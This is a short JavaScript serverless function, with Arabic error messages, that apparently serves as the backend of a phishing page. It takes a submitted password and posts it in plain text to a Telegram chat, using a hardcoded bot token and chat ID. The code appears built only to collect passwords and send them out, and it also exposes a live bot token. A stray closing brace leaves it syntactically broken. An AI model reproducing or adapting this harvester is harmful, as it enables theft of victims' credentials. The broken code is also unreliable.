const BOT_TOKEN = "9195323787:AAHV95AHKtcnAPExfE6PhvtWAUUqiydpJwk";
const CHAT_ID = "6684879160";

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'طريقة غير مسموحة' });
  }

  const password = String((req.body || {}).password || '').trim().replace(/\s+/g, ' ');
  }

  try {
    const r = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: password })
      }
    );
    if (!r.ok) return res.status(502).json({ error: 'تعذّر الإرسال إلى تيليغرام' });
    res.status(200).json({ ok: true });
  } catch (e) {
    res.status(500).json({ error: 'خطأ في السيرفر' });
  }
};
